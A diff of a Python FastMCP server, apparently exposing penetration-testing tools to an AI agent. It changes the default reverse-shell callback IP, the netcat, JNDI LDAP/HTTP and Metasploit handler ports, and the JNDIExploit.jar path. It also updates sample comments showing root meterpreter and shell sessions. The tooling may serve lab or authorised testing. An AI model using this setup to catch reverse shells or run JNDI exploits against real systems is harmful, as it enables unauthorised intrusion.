@@ -38,12 +38,13 @@ from fastmcp import FastMCP
 # ============== 常量配置 ==============
 
 # 默认配置（可通过环境变量覆盖）
-DEFAULT_IP = os.getenv("REVERSE_IP", "192.168.56.101")
+DEFAULT_IP = os.getenv("REVERSE_IP", "192.168.52.101")
 DEFAULT_NC_PORT = int(os.getenv("NC_PORT", "10080"))
 DEFAULT_JNDI_LDAP_PORT = int(os.getenv("JNDI_LDAP_PORT", "1389"))
 DEFAULT_JNDI_HTTP_PORT = int(os.getenv("JNDI_HTTP_PORT", "8080"))
 DEFAULT_MSF_PORT = int(os.getenv("MSF_PORT", "4444"))
-DEFAULT_JNDI_JAR_PATH = os.getenv("JNDI_JAR_PATH", "/opt/JNDIExploit.jar")
+DEFAULT_WORKSPACE = os.getenv("WORKSPACE", "/opt/workspace")
+DEFAULT_JNDI_JAR_PATH = os.path.join(DEFAULT_WORKSPACE, "JNDIExploit.jar")
 
 # tmux session 名称前缀
 TMUX_SESSION_NAME = "reverse_tools"
@@ -147,11 +148,12 @@ class ReverseToolManager:
                 if sessions:
                     self.session = sessions[0]
                 else:
-                    # 创建新 session
+                    # 创建新 session，优先使用 WORKSPACE 环境变量
+                    workspace_dir = os.getenv("WORKSPACE", "/opt/workspace")
                     self.session = self.server.new_session(
                         session_name=TMUX_SESSION_NAME,
                         attach=False,
-                        start_directory="/home/ubuntu/Workspace"
+                        start_directory=workspace_dir
                     )
                     self.session.set_option('status', 'off')
                     # 关闭默认的第一个 pane（如果不需要）
@@ -259,8 +261,8 @@ class ReverseToolManager:
         #
         #   Id  Name  Type                     Information             Connection
         #   --  ----  ----                     -----------             ----------
-        #   1         meterpreter x86/linux    root @ 192.168.1.100    192.168.56.101:4444 -> 192.168.1.100:12345 (192.168.1.100)
-        #   2         shell x64/linux          www-data @ 10.0.0.50    192.168.56.101:4445 -> 10.0.0.50:54321 (10.0.0.50)
+        #   1         meterpreter x86/linux    root @ 192.168.1.100    192.168.52.101:4444 -> 192.168.1.100:12345 (192.168.1.100)
+        #   2         shell x64/linux          www-data @ 10.0.0.50    192.168.52.101:4445 -> 10.0.0.50:54321 (10.0.0.50)
 
         lines = output.split('\n')
         for line in lines:
